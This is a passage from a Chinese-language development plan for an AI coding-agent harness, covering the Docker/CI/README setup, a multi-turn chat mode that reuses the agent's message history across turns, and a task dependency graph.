git add src/web/server.ts tests/unit/webui.test.ts
git commit -m "feat(webui): add Express + SSE web server for HITL approval"
```

---

### Task 15: 集成测试 + Docker + README

**目的：** 端到端集成测试、Dockerfile、README 文档，完成项目交付。

**依赖：** Task 13 (CLI)（Task 14 WebUI 已弃用，不再依赖）

**分支：** `task/15-integration-docker`

**Files:**
- Create: `Dockerfile`
- Create: `README.md`
- Create: `.github/workflows/ci.yml`

---

- [ ] **Step 1: 创建 Dockerfile**

```dockerfile
FROM node:22-alpine
WORKDIR /workspace
RUN npm install -g ai4se-harness
ENTRYPOINT ["harness"]
```

- [ ] **Step 2: 创建 CI 配置**

创建 `.github/workflows/ci.yml`：

```yaml
name: CI
on: [push, pull_request]
jobs:
  unit-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: npm ci
      - run: npx tsc --noEmit
      - run: npm test
```

- [ ] **Step 3: 创建 README.md**

见文件。包含：项目简介、安装方式（npm + Docker）、Key 安全配置、已知限制、目录结构。

- [ ] **Step 4: 运行全部测试**

```bash
npx vitest run
```

预期：全部单元测试通过（零网络依赖）

- [ ] **Step 5: Commit**

```bash
git checkout -b task/15-integration-docker
git add Dockerfile .github/workflows/ci.yml README.md
git commit -m "feat: add Dockerfile, CI config, and README"
```

---

### Task 16: 交互式多轮对话（chat 模式）

**目的：** 在 CLI 中新增 `harness chat` 子命令，支持用户与 agent 持续多轮对话，agent 记住上下文继续工作（而非每次 run 一个独立任务）。

**依赖：** Task 12 (AgentLoop), Task 13 (CLI)

**分支：** `task/16-interactive-chat`

**背景：** 当前 `harness run "任务"` 是「一次任务一次进程」，`AgentLoop.run()` 内部虽保留了完整 `messages[]`（system prompt + 用户任务 + assistant 回复 + 工具结果 + 反馈），但方法返回后该数组销毁。本 task 将消息历史暴露并跨轮复用，实现类似结对编程的持续对话体验。

**Files:**
- Modify: `src/core/agent-loop.ts`（新增 `continue()` 方法 + `messages` getter）
- Modify: `src/core/types.ts`（`AgentResult` 扩展返回消息历史）
- Modify: `src/cli/index.ts`（新增 `harness chat` 子命令 + REPL 循环）
- Create: `tests/unit/agent-loop-continue.test.ts`

**Interfaces:**
- Produces:
  - `AgentLoop.continue(task: string): Promise<AgentResult>` — 在已有消息历史上追加用户消息继续循环，而非重建 system prompt
  - `AgentLoop.getMessages(): Message[]` — 返回当前会话消息历史（只读副本）
  - `AgentResult.messages?: Message[]` — 可选返回最终消息历史

---

- [ ] **Step 1: 实现 AgentLoop.continue()**

在 `src/core/agent-loop.ts` 中：

1. 将 `messages` 从 `run()` 的局部变量提升为实例属性（或新增 `private messages: Message[]`）
2. 新增 `continue(task: string, maxRounds = 50): Promise<AgentResult>`：
   - 复用已有 `messages`（含之前的 system prompt、assistant 回复、工具结果、反馈）
   - 追加一条 `{ role: 'user', content: task }`
   - 进入主循环（逻辑与 `run()` 尾部相同，抽公共方法避免重复）
3. 新增 `getMessages(): Message[]` 返回只读副本
4. `run()` 内部改为：初始化 `messages` → 复用 `continue` 的循环逻辑（保持向后兼容，`run` 语义不变）

**注意：** 主循环逻辑（LLM 调用 → 护栏 → 执行 → 反馈 → 停机判断）需抽取为公共私有方法 `runLoop(task, maxRounds)`，`run()` 和 `continue()` 共用，避免代码重复。

---

- [ ] **Step 2: 扩展 AgentResult 类型**

在 `src/core/types.ts` 中 `AgentResult` 接口新增可选字段：

```typescript
export interface AgentResult {
  success: boolean;
  rounds: number;
  summary: string;
  phase: AgentPhase;
  messages?: Message[];  // 最终消息历史（供 chat 模式复用）
}
```

---

- [ ] **Step 3: 实现 harness chat 子命令**

在 `src/cli/index.ts` 中新增 `chat` 命令：

```typescript
program
  .command('chat')
  .description('Interactive multi-turn chat with the agent')
  .action(async () => {
    // 1. 加载配置 + 解析 API key（复用 run 的初始化逻辑）
    // 2. 初始化 llm / tools / memory / loop（同一实例复用）
    // 3. 注册 loop.hitl.onRequest 回调（同 run）
    // 4. 创建 readline 接口，进入 READ-EVAL-PRINT 循环：
    //    - 打印 "harness> " 提示符
    //    - 读用户输入，空行跳过，输入 exit/quit 退出
    //    - 首次输入 → loop.run(input)；后续输入 → loop.continue(input)
    //    - 打印 agent 结果摘要
  });
```

**注意：** 复用同一 `AgentLoop` 实例，确保 `MemoryStore`（决策记忆）跨轮持久，避免重复弹 HITL。

---

- [ ] **Step 4: 写失败测试**

创建 `tests/unit/agent-loop-continue.test.ts`，用 mock LLM 验证：

1. `run()` 后 `continue()` 的消息历史包含第一轮的 assistant 回复和工具结果
2. `continue()` 追加 user 消息而非重建 system prompt（断言 messages[0] 仍是 system、不重复）
3. `continue()` 复用同一 MemoryStore 决策记录（第一轮 approved 的决策在第二轮仍生效）
4. `getMessages()` 返回只读副本（修改返回值不影响内部状态）
5. `run()` 向后兼容（原有测试不受影响）

---

- [ ] **Step 5: 运行测试确认失败 → 实现 → 确认通过**

```bash
npx vitest run tests/unit/agent-loop-continue.test.ts
npx tsc --noEmit
npx vitest run
```

预期：新测试通过 + 全量零回归。

---

- [ ] **Step 6: Commit**

```bash
git checkout -b task/16-interactive-chat
git add src/core/agent-loop.ts src/core/types.ts src/cli/index.ts tests/unit/agent-loop-continue.test.ts
git commit -m "feat(cli): add interactive multi-turn chat mode"
```

---

## 依赖图与并行策略

```
Task 0 (scaffold + types)
 │
 ├──→ Task 1 (LLM) ────────────────────────────┐
 ├──→ Task 2 (config) ─────────────────────────┤
 ├──→ Task 3 (credentials) ────────────────────┤
 ├──→ Task 4 (tool system) ──→ Task 5 (tools) ─┤
 ├──→ Task 9 (memory) ──→ Task 10 (fingerprint)┤
 │                                              │
 ├──→ Task 6 (guardrails engine) ───────────────┤
 │     └──→ Task 7 (HITL) ─────────────────────┤
 │     └──→ Task 8 (scope fence) ──────────────┤
 │                                              │
 ├──→ Task 11 (feedback) ──────────────────────┤
 │                                              │
 └──────────────────────────────────────────────┤
                                                ▼
                                         Task 12 (agent loop)
                                                │
                                                ▼
                                         Task 13 (CLI)
                                                │
                              ┌─────────────────┴──────────────────┐
                              ▼                                    ▼
                         Task 15 (integration + docker)      Task 16 (interactive chat)
```

**可并行组：**
- 组 A（Task 0 之后）：Task 1, 2, 3, 4, 9, 6, 11 — 7 个 task 可同时开工
- 组 B（Task 4 + 6 之后）：Task 5, 7, 8 — 3 个 task 可并行
- ~~组 C（Task 12 之后）：Task 13, 14 — 2 个 task 可并行~~（Task 14 已弃用）
- 组 D（Task 13 之后）：Task 15, 16 — 2 个 task 可并行（都只依赖 Task 13）

**总计 17 个 task（Task 0 到 Task 16，其中 Task 14 已弃用跳过），预计工作量约 8–12 小时。**

---

> 本计划遵循 TDD：每个 task 先写失败测试 → 实现 → 确认绿 → commit。所有核心模块用 mock LLM 验证。实现期间 PLAN.md 持续更新 task 状态和 commit hash。
